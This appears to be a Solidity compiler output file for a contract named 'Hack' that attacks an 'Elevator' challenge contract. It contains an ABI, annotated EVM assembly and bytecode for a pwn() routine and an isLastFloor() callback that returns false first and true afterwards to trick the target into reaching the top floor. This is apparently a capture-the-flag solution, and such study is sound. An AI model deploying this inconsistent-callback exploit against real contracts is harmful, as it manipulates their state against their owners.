{
	"contracts/Elevator.sol": {
		"Hack": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "_trgt",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"inputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"name": "isLastFloor",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "pwn",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"contracts/Elevator.sol\":57:419  contract Hack{... */\n  mstore(0x40, 0xa0)\n    /* \"contracts/Elevator.sol\":134:135  0 */\n  0x00\n    /* \"contracts/Elevator.sol\":113:135  uint private count = 0 */\n  0x00\n  sstore\n    /* \"contracts/Elevator.sol\":141:207  constructor(address _trgt) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  revert(0x00, 0x00)\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"contracts/Elevator.sol\":194:199  _trgt */\n  dup1\n    /* \"contracts/Elevator.sol\":178:200  trgt = Elevator(_trgt) */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  0x80\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  dup2\n  mstore\n  pop\n  pop\n    /* \"contracts/Elevator.sol\":141:207  constructor(address _trgt) {... */\n  pop\n    /* \"contracts/Elevator.sol\":57:419  contract Hack{... */\n  jump(tag_6)\n    /* \"#utility.yul\":88:205   */\ntag_8:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  0x00\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_10:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_11:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_20\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_10\n  jump\t// in\ntag_20:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:690   */\ntag_12:\n    /* \"#utility.yul\":641:665   */\n  tag_22\n    /* \"#utility.yul\":659:664   */\n  dup2\n    /* \"#utility.yul\":641:665   */\n  tag_11\n  jump\t// in\ntag_22:\n    /* \"#utility.yul\":634:639   */\n  dup2\n    /* \"#utility.yul\":631:666   */\n  eq\n    /* \"#utility.yul\":621:684   */\n  tag_23\n  jumpi\n    /* \"#utility.yul\":680:681   */\n  0x00\n    /* \"#utility.yul\":677:678   */\n  0x00\n    /* \"#utility.yul\":670:682   */\n  revert\n    /* \"#utility.yul\":621:684   */\ntag_23:\n    /* \"#utility.yul\":568:690   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":696:839   */\ntag_13:\n    /* \"#utility.yul\":753:758   */\n  0x00\n    /* \"#utility.yul\":784:790   */\n  dup2\n    /* \"#utility.yul\":778:791   */\n  mload\n    /* \"#utility.yul\":769:791   */\n  swap1\n  pop\n    /* \"#utility.yul\":800:833   */\n  tag_25\n    /* \"#utility.yul\":827:832   */\n  dup2\n    /* \"#utility.yul\":800:833   */\n  tag_12\n  jump\t// in\ntag_25:\n    /* \"#utility.yul\":696:839   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":845:1196   */\ntag_3:\n    /* \"#utility.yul\":915:921   */\n  0x00\n    /* \"#utility.yul\":964:966   */\n  0x20\n    /* \"#utility.yul\":952:961   */\n  dup3\n    /* \"#utility.yul\":943:950   */\n  dup5\n    /* \"#utility.yul\":939:962   */\n  sub\n    /* \"#utility.yul\":935:967   */\n  slt\n    /* \"#utility.yul\":932:1051   */\n  iszero\n  tag_27\n  jumpi\n    /* \"#utility.yul\":970:1049   */\n  tag_28\n  tag_8\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":932:1051   */\ntag_27:\n    /* \"#utility.yul\":1090:1091   */\n  0x00\n    /* \"#utility.yul\":1115:1179   */\n  tag_29\n    /* \"#utility.yul\":1171:1178   */\n  dup5\n    /* \"#utility.yul\":1162:1168   */\n  dup3\n    /* \"#utility.yul\":1151:1160   */\n  dup6\n    /* \"#utility.yul\":1147:1169   */\n  add\n    /* \"#utility.yul\":1115:1179   */\n  tag_13\n  jump\t// in\ntag_29:\n    /* \"#utility.yul\":1105:1179   */\n  swap2\n  pop\n    /* \"#utility.yul\":1061:1189   */\n  pop\n    /* \"#utility.yul\":845:1196   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"contracts/Elevator.sol\":57:419  contract Hack{... */\ntag_6:\n  mload(0x80)\n  codecopy(0x00, dataOffset(sub_0), dataSize(sub_0))\n  0x00\n  assignImmutable(\"0x13600b294191fc92924bb3ce4b969c1e7e2bab8f4c93c3fc6d0a51733df3c060\")\n  return(0x00, dataSize(sub_0))\nstop\n\nsub_0: assembly {\n        /* \"contracts/Elevator.sol\":57:419  contract Hack{... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      revert(0x00, 0x00)\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x5f9a4bca\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xdd365b8b\n      eq\n      tag_4\n      jumpi\n    tag_2:\n      revert(0x00, 0x00)\n        /* \"contracts/Elevator.sol\":316:417  function isLastFloor(uint) external returns (bool){... */\n    tag_3:\n      tag_5\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_6\n      swap2\n      swap1\n      tag_7\n      jump\t// in\n    tag_6:\n      tag_8\n      jump\t// in\n    tag_5:\n      mload(0x40)\n      tag_9\n      swap2\n      swap1\n      tag_10\n      jump\t// in\n    tag_9:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Elevator.sol\":212:311  function pwn() external{... */\n    tag_4:\n      tag_11\n      tag_12\n      jump\t// in\n    tag_11:\n      stop\n        /* \"contracts/Elevator.sol\":316:417  function isLastFloor(uint) external returns (bool){... */\n    tag_8:\n        /* \"contracts/Elevator.sol\":361:365  bool */\n      0x00\n        /* \"contracts/Elevator.sol\":376:381  count */\n      0x00\n      0x00\n        /* \"contracts/Elevator.sol\":376:384  count ++ */\n      dup2\n      sload\n      dup1\n      swap3\n      swap2\n      swap1\n      tag_14\n      swap1\n      tag_15\n      jump\t// in\n    tag_14:\n      swap2\n      swap1\n      pop\n      sstore\n      pop\n        /* \"contracts/Elevator.sol\":409:410  1 */\n      0x01\n        /* \"contracts/Elevator.sol\":401:406  count */\n      sload(0x00)\n        /* \"contracts/Elevator.sol\":401:410  count > 1 */\n      gt\n        /* \"contracts/Elevator.sol\":394:410  return count > 1 */\n      swap1\n      pop\n        /* \"contracts/Elevator.sol\":316:417  function isLastFloor(uint) external returns (bool){... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"contracts/Elevator.sol\":212:311  function pwn() external{... */\n    tag_12:\n        /* \"contracts/Elevator.sol\":245:249  trgt */\n      immutable(\"0x13600b294191fc92924bb3ce4b969c1e7e2bab8f4c93c3fc6d0a51733df3c060\")\n        /* \"contracts/Elevator.sol\":245:254  trgt.goTo */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xed9a7134\n        /* \"contracts/Elevator.sol\":255:256  1 */\n      0x01\n        /* \"contracts/Elevator.sol\":245:257  trgt.goTo(1) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_17\n      swap2\n      swap1\n      tag_18\n      jump\t// in\n    tag_17:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_19\n      jumpi\n      revert(0x00, 0x00)\n    tag_19:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_21\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_21:\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/Elevator.sol\":275:279  trgt */\n      immutable(\"0x13600b294191fc92924bb3ce4b969c1e7e2bab8f4c93c3fc6d0a51733df3c060\")\n        /* \"contracts/Elevator.sol\":275:283  trgt.top */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xfe6dcdba\n        /* \"contracts/Elevator.sol\":275:285  trgt.top() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_23\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_23:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_24\n      swap2\n      swap1\n      tag_25\n      jump\t// in\n    tag_24:\n        /* \"contracts/Elevator.sol\":267:304  require(trgt.top(), \"Not top floor!\") */\n      tag_26\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_27\n      swap1\n      tag_28\n      jump\t// in\n    tag_27:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_26:\n        /* \"contracts/Elevator.sol\":212:311  function pwn() external{... */\n      jump\t// out\n        /* \"#utility.yul\":88:205   */\n    tag_30:\n        /* \"#utility.yul\":197:198   */\n      0x00\n        /* \"#utility.yul\":194:195   */\n      0x00\n        /* \"#utility.yul\":187:199   */\n      revert\n        /* \"#utility.yul\":334:411   */\n    tag_32:\n        /* \"#utility.yul\":371:378   */\n      0x00\n        /* \"#utility.yul\":400:405   */\n      dup2\n        /* \"#utility.yul\":389:405   */\n      swap1\n      pop\n        /* \"#utility.yul\":334:411   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":417:539   */\n    tag_33:\n        /* \"#utility.yul\":490:514   */\n      tag_53\n        /* \"#utility.yul\":508:513   */\n      dup2\n        /* \"#utility.yul\":490:514   */\n      tag_32\n      jump\t// in\n    tag_53:\n        /* \"#utility.yul\":483:488   */\n      dup2\n        /* \"#utility.yul\":480:515   */\n      eq\n        /* \"#utility.yul\":470:533   */\n      tag_54\n      jumpi\n        /* \"#utility.yul\":529:530   */\n      0x00\n        /* \"#utility.yul\":526:527   */\n      0x00\n        /* \"#utility.yul\":519:531   */\n      revert\n        /* \"#utility.yul\":470:533   */\n    tag_54:\n        /* \"#utility.yul\":417:539   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":545:684   */\n    tag_34:\n        /* \"#utility.yul\":591:596   */\n      0x00\n        /* \"#utility.yul\":629:635   */\n      dup2\n        /* \"#utility.yul\":616:636   */\n      calldataload\n        /* \"#utility.yul\":607:636   */\n      swap1\n      pop\n        /* \"#utility.yul\":645:678   */\n      tag_56\n        /* \"#utility.yul\":672:677   */\n      dup2\n        /* \"#utility.yul\":645:678   */\n      tag_33\n      jump\t// in\n    tag_56:\n        /* \"#utility.yul\":545:684   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":690:1019   */\n    tag_7:\n        /* \"#utility.yul\":749:755   */\n      0x00\n        /* \"#utility.yul\":798:800   */\n      0x20\n        /* \"#utility.yul\":786:795   */\n      dup3\n        /* \"#utility.yul\":777:784   */\n      dup5\n        /* \"#utility.yul\":773:796   */\n      sub\n        /* \"#utility.yul\":769:801   */\n      slt\n        /* \"#utility.yul\":766:885   */\n      iszero\n      tag_58\n      jumpi\n        /* \"#utility.yul\":804:883   */\n      tag_59\n      tag_30\n      jump\t// in\n    tag_59:\n        /* \"#utility.yul\":766:885   */\n    tag_58:\n        /* \"#utility.yul\":924:925   */\n      0x00\n        /* \"#utility.yul\":949:1002   */\n      tag_60\n        /* \"#utility.yul\":994:1001   */\n      dup5\n        /* \"#utility.yul\":985:991   */\n      dup3\n        /* \"#utility.yul\":974:983   */\n      dup6\n        /* \"#utility.yul\":970:992   */\n      add\n        /* \"#utility.yul\":949:1002   */\n      tag_34\n      jump\t// in\n    tag_60:\n        /* \"#utility.yul\":939:1002   */\n      swap2\n      pop\n        /* \"#utility.yul\":895:1012   */\n      pop\n        /* \"#utility.yul\":690:1019   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1025:1115   */\n    tag_35:\n        /* \"#utility.yul\":1059:1066   */\n      0x00\n        /* \"#utility.yul\":1102:1107   */\n      dup2\n        /* \"#utility.yul\":1095:1108   */\n      iszero\n        /* \"#utility.yul\":1088:1109   */\n      iszero\n        /* \"#utility.yul\":1077:1109   */\n      swap1\n      pop\n        /* \"#utility.yul\":1025:1115   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1121:1230   */\n    tag_36:\n        /* \"#utility.yul\":1202:1223   */\n      tag_63\n        /* \"#utility.yul\":1217:1222   */\n      dup2\n        /* \"#utility.yul\":1202:1223   */\n      tag_35\n      jump\t// in\n    tag_63:\n        /* \"#utility.yul\":1197:1200   */\n      dup3\n        /* \"#utility.yul\":1190:1224   */\n      mstore\n        /* \"#utility.yul\":1121:1230   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1236:1446   */\n    tag_10:\n        /* \"#utility.yul\":1323:1327   */\n      0x00\n        /* \"#utility.yul\":1361:1363   */\n      0x20\n        /* \"#utility.yul\":1350:1359   */\n      dup3\n        /* \"#utility.yul\":1346:1364   */\n      add\n        /* \"#utility.yul\":1338:1364   */\n      swap1\n      pop\n        /* \"#utility.yul\":1374:1439   */\n      tag_65\n        /* \"#utility.yul\":1436:1437   */\n      0x00\n        /* \"#utility.yul\":1425:1434   */\n      dup4\n        /* \"#utility.yul\":1421:1438   */\n      add\n        /* \"#utility.yul\":1412:1418   */\n      dup5\n        /* \"#utility.yul\":1374:1439   */\n      tag_36\n      jump\t// in\n    tag_65:\n        /* \"#utility.yul\":1236:1446   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1452:1632   */\n    tag_37:\n        /* \"#utility.yul\":1500:1577   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":1497:1498   */\n      0x00\n        /* \"#utility.yul\":1490:1578   */\n      mstore\n        /* \"#utility.yul\":1597:1601   */\n      0x11\n        /* \"#utility.yul\":1594:1595   */\n      0x04\n        /* \"#utility.yul\":1587:1602   */\n      mstore\n        /* \"#utility.yul\":1621:1625   */\n      0x24\n        /* \"#utility.yul\":1618:1619   */\n      0x00\n        /* \"#utility.yul\":1611:1626   */\n      revert\n        /* \"#utility.yul\":1638:1871   */\n    tag_15:\n        /* \"#utility.yul\":1677:1680   */\n      0x00\n        /* \"#utility.yul\":1700:1724   */\n      tag_68\n        /* \"#utility.yul\":1718:1723   */\n      dup3\n        /* \"#utility.yul\":1700:1724   */\n      tag_32\n      jump\t// in\n    tag_68:\n        /* \"#utility.yul\":1691:1724   */\n      swap2\n      pop\n        /* \"#utility.yul\":1746:1812   */\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":1739:1744   */\n      dup3\n        /* \"#utility.yul\":1736:1813   */\n      sub\n        /* \"#utility.yul\":1733:1836   */\n      tag_69\n      jumpi\n        /* \"#utility.yul\":1816:1834   */\n      tag_70\n      tag_37\n      jump\t// in\n    tag_70:\n        /* \"#utility.yul\":1733:1836   */\n    tag_69:\n        /* \"#utility.yul\":1863:1864   */\n      0x01\n        /* \"#utility.yul\":1856:1861   */\n      dup3\n        /* \"#utility.yul\":1852:1865   */\n      add\n        /* \"#utility.yul\":1845:1865   */\n      swap1\n      pop\n        /* \"#utility.yul\":1638:1871   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1877:1962   */\n    tag_38:\n        /* \"#utility.yul\":1922:1929   */\n      0x00\n        /* \"#utility.yul\":1951:1956   */\n      dup2\n        /* \"#utility.yul\":1940:1956   */\n      swap1\n      pop\n        /* \"#utility.yul\":1877:1962   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1968:2028   */\n    tag_39:\n        /* \"#utility.yul\":1996:1999   */\n      0x00\n        /* \"#utility.yul\":2017:2022   */\n      dup2\n        /* \"#utility.yul\":2010:2022   */\n      swap1\n      pop\n        /* \"#utility.yul\":1968:2028   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2034:2192   */\n    tag_40:\n        /* \"#utility.yul\":2092:2101   */\n      0x00\n        /* \"#utility.yul\":2125:2186   */\n      tag_74\n        /* \"#utility.yul\":2143:2185   */\n      tag_75\n        /* \"#utility.yul\":2152:2184   */\n      tag_76\n        /* \"#utility.yul\":2178:2183   */\n      dup5\n        /* \"#utility.yul\":2152:2184   */\n      tag_38\n      jump\t// in\n    tag_76:\n        /* \"#utility.yul\":2143:2185   */\n      tag_39\n      jump\t// in\n    tag_75:\n        /* \"#utility.yul\":2125:2186   */\n      tag_32\n      jump\t// in\n    tag_74:\n        /* \"#utility.yul\":2112:2186   */\n      swap1\n      pop\n        /* \"#utility.yul\":2034:2192   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2198:2345   */\n    tag_41:\n        /* \"#utility.yul\":2293:2338   */\n      tag_78\n        /* \"#utility.yul\":2332:2337   */\n      dup2\n        /* \"#utility.yul\":2293:2338   */\n      tag_40\n      jump\t// in\n    tag_78:\n        /* \"#utility.yul\":2288:2291   */\n      dup3\n        /* \"#utility.yul\":2281:2339   */\n      mstore\n        /* \"#utility.yul\":2198:2345   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2351:2589   */\n    tag_18:\n        /* \"#utility.yul\":2452:2456   */\n      0x00\n        /* \"#utility.yul\":2490:2492   */\n      0x20\n        /* \"#utility.yul\":2479:2488   */\n      dup3\n        /* \"#utility.yul\":2475:2493   */\n      add\n        /* \"#utility.yul\":2467:2493   */\n      swap1\n      pop\n        /* \"#utility.yul\":2503:2582   */\n      tag_80\n        /* \"#utility.yul\":2579:2580   */\n      0x00\n        /* \"#utility.yul\":2568:2577   */\n      dup4\n        /* \"#utility.yul\":2564:2581   */\n      add\n        /* \"#utility.yul\":2555:2561   */\n      dup5\n        /* \"#utility.yul\":2503:2582   */\n      tag_41\n      jump\t// in\n    tag_80:\n        /* \"#utility.yul\":2351:2589   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2595:2711   */\n    tag_42:\n        /* \"#utility.yul\":2665:2686   */\n      tag_82\n        /* \"#utility.yul\":2680:2685   */\n      dup2\n        /* \"#utility.yul\":2665:2686   */\n      tag_35\n      jump\t// in\n    tag_82:\n        /* \"#utility.yul\":2658:2663   */\n      dup2\n        /* \"#utility.yul\":2655:2687   */\n      eq\n        /* \"#utility.yul\":2645:2705   */\n      tag_83\n      jumpi\n        /* \"#utility.yul\":2701:2702   */\n      0x00\n        /* \"#utility.yul\":2698:2699   */\n      0x00\n        /* \"#utility.yul\":2691:2703   */\n      revert\n        /* \"#utility.yul\":2645:2705   */\n    tag_83:\n        /* \"#utility.yul\":2595:2711   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2717:2854   */\n    tag_43:\n        /* \"#utility.yul\":2771:2776   */\n      0x00\n        /* \"#utility.yul\":2802:2808   */\n      dup2\n        /* \"#utility.yul\":2796:2809   */\n      mload\n        /* \"#utility.yul\":2787:2809   */\n      swap1\n      pop\n        /* \"#utility.yul\":2818:2848   */\n      tag_85\n        /* \"#utility.yul\":2842:2847   */\n      dup2\n        /* \"#utility.yul\":2818:2848   */\n      tag_42\n      jump\t// in\n    tag_85:\n        /* \"#utility.yul\":2717:2854   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2860:3205   */\n    tag_25:\n        /* \"#utility.yul\":2927:2933   */\n      0x00\n        /* \"#utility.yul\":2976:2978   */\n      0x20\n        /* \"#utility.yul\":2964:2973   */\n      dup3\n        /* \"#utility.yul\":2955:2962   */\n      dup5\n        /* \"#utility.yul\":2951:2974   */\n      sub\n        /* \"#utility.yul\":2947:2979   */\n      slt\n        /* \"#utility.yul\":2944:3063   */\n      iszero\n      tag_87\n      jumpi\n        /* \"#utility.yul\":2982:3061   */\n      tag_88\n      tag_30\n      jump\t// in\n    tag_88:\n        /* \"#utility.yul\":2944:3063   */\n    tag_87:\n        /* \"#utility.yul\":3102:3103   */\n      0x00\n        /* \"#utility.yul\":3127:3188   */\n      tag_89\n        /* \"#utility.yul\":3180:3187   */\n      dup5\n        /* \"#utility.yul\":3171:3177   */\n      dup3\n        /* \"#utility.yul\":3160:3169   */\n      dup6\n        /* \"#utility.yul\":3156:3178   */\n      add\n        /* \"#utility.yul\":3127:3188   */\n      tag_43\n      jump\t// in\n    tag_89:\n        /* \"#utility.yul\":3117:3188   */\n      swap2\n      pop\n        /* \"#utility.yul\":3073:3198   */\n      pop\n        /* \"#utility.yul\":2860:3205   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3211:3380   */\n    tag_44:\n        /* \"#utility.yul\":3295:3306   */\n      0x00\n        /* \"#utility.yul\":3329:3335   */\n      dup3\n        /* \"#utility.yul\":3324:3327   */\n      dup3\n        /* \"#utility.yul\":3317:3336   */\n      mstore\n        /* \"#utility.yul\":3369:3373   */\n      0x20\n        /* \"#utility.yul\":3364:3367   */\n      dup3\n        /* \"#utility.yul\":3360:3374   */\n      add\n        /* \"#utility.yul\":3345:3374   */\n      swap1\n      pop\n        /* \"#utility.yul\":3211:3380   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3386:3550   */\n    tag_45:\n        /* \"#utility.yul\":3526:3542   */\n      0x4e6f7420746f7020666c6f6f7221000000000000000000000000000000000000\n        /* \"#utility.yul\":3522:3523   */\n      0x00\n        /* \"#utility.yul\":3514:3520   */\n      dup3\n        /* \"#utility.yul\":3510:3524   */\n      add\n        /* \"#utility.yul\":3503:3543   */\n      mstore\n        /* \"#utility.yul\":3386:3550   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3556:3922   */\n    tag_46:\n        /* \"#utility.yul\":3698:3701   */\n      0x00\n        /* \"#utility.yul\":3719:3786   */\n      tag_93\n        /* \"#utility.yul\":3783:3785   */\n      0x0e\n        /* \"#utility.yul\":3778:3781   */\n      dup4\n        /* \"#utility.yul\":3719:3786   */\n      tag_44\n      jump\t// in\n    tag_93:\n        /* \"#utility.yul\":3712:3786   */\n      swap2\n      pop\n        /* \"#utility.yul\":3795:3888   */\n      tag_94\n        /* \"#utility.yul\":3884:3887   */\n      dup3\n        /* \"#utility.yul\":3795:3888   */\n      tag_45\n      jump\t// in\n    tag_94:\n        /* \"#utility.yul\":3913:3915   */\n      0x20\n        /* \"#utility.yul\":3908:3911   */\n      dup3\n        /* \"#utility.yul\":3904:3916   */\n      add\n        /* \"#utility.yul\":3897:3916   */\n      swap1\n      pop\n        /* \"#utility.yul\":3556:3922   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3928:4347   */\n    tag_28:\n        /* \"#utility.yul\":4094:4098   */\n      0x00\n        /* \"#utility.yul\":4132:4134   */\n      0x20\n        /* \"#utility.yul\":4121:4130   */\n      dup3\n        /* \"#utility.yul\":4117:4135   */\n      add\n        /* \"#utility.yul\":4109:4135   */\n      swap1\n      pop\n        /* \"#utility.yul\":4181:4190   */\n      dup2\n        /* \"#utility.yul\":4175:4179   */\n      dup2\n        /* \"#utility.yul\":4171:4191   */\n      sub\n        /* \"#utility.yul\":4167:4168   */\n      0x00\n        /* \"#utility.yul\":4156:4165   */\n      dup4\n        /* \"#utility.yul\":4152:4169   */\n      add\n        /* \"#utility.yul\":4145:4192   */\n      mstore\n        /* \"#utility.yul\":4209:4340   */\n      tag_96\n        /* \"#utility.yul\":4335:4339   */\n      dup2\n        /* \"#utility.yul\":4209:4340   */\n      tag_46\n      jump\t// in\n    tag_96:\n        /* \"#utility.yul\":4201:4340   */\n      swap1\n      pop\n        /* \"#utility.yul\":3928:4347   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220dfa6a8d7c94cdd1514e56ba8449c8e12762ea6f2240d9cd4d93de5013321489c64736f6c634300081c0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "60a06040525f5f55348015610012575f5ffd5b50604051610566380380610566833981810160405281019061003491906100cc565b8073ffffffffffffffffffffffffffffffffffffffff1660808173ffffffffffffffffffffffffffffffffffffffff1681525050506100f7565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f61009b82610072565b9050919050565b6100ab81610091565b81146100b5575f5ffd5b50565b5f815190506100c6816100a2565b92915050565b5f602082840312156100e1576100e061006e565b5b5f6100ee848285016100b8565b91505092915050565b6080516104516101155f395f81816097015261011e01526104515ff3fe608060405234801561000f575f5ffd5b5060043610610034575f3560e01c80635f9a4bca14610038578063dd365b8b14610068575b5f5ffd5b610052600480360381019061004d9190610221565b610072565b60405161005f9190610266565b60405180910390f35b610070610095565b005b5f5f5f815480929190610084906102ac565b919050555060015f54119050919050565b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663ed9a713460016040518263ffffffff1660e01b81526004016100ef9190610335565b5f604051808303815f87803b158015610106575f5ffd5b505af1158015610118573d5f5f3e3d5ffd5b505050507f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663fe6dcdba6040518163ffffffff1660e01b8152600401602060405180830381865afa158015610185573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101a99190610378565b6101e8576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016101df906103fd565b60405180910390fd5b565b5f5ffd5b5f819050919050565b610200816101ee565b811461020a575f5ffd5b50565b5f8135905061021b816101f7565b92915050565b5f60208284031215610236576102356101ea565b5b5f6102438482850161020d565b91505092915050565b5f8115159050919050565b6102608161024c565b82525050565b5f6020820190506102795f830184610257565b92915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f6102b6826101ee565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82036102e8576102e761027f565b5b600182019050919050565b5f819050919050565b5f819050919050565b5f61031f61031a610315846102f3565b6102fc565b6101ee565b9050919050565b61032f81610305565b82525050565b5f6020820190506103485f830184610326565b92915050565b6103578161024c565b8114610361575f5ffd5b50565b5f815190506103728161034e565b92915050565b5f6020828403121561038d5761038c6101ea565b5b5f61039a84828501610364565b91505092915050565b5f82825260208201905092915050565b7f4e6f7420746f7020666c6f6f72210000000000000000000000000000000000005f82015250565b5f6103e7600e836103a3565b91506103f2826103b3565b602082019050919050565b5f6020820190508181035f830152610414816103db565b905091905056fea2646970667358221220dfa6a8d7c94cdd1514e56ba8449c8e12762ea6f2240d9cd4d93de5013321489c64736f6c634300081c0033",
